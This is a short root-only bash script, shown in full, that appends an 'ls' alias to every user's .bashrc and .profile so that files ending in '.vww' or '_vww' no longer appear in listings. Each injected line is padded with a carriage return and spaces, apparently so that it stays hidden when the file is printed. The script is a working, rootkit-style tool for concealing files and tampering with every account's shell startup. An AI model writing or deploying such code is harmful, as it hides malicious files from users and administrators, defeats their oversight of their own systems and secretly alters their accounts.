#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

echo "=== Hiding extensions ==="

for homedir in $(getent passwd | cut -d: -f6); do
    mkdir -p $homedir > /dev/null
    touch $homedir/.bashrc > /dev/null
    touch $homedir/.profile > /dev/null
    echo "alias ls=\"/usr/bin/ls --color=auto --ignore='*.vww' --ignore='*_vww' \"#\r                                                                                                                " >> $homedir/.bashrc
    echo "alias ls=\"/usr/bin/ls --color=auto --ignore='*.vww' --ignore='*_vww' \"#\r                                                                                                                " >> $homedir/.profile
    echo "Wrote hiders to $homedir"
done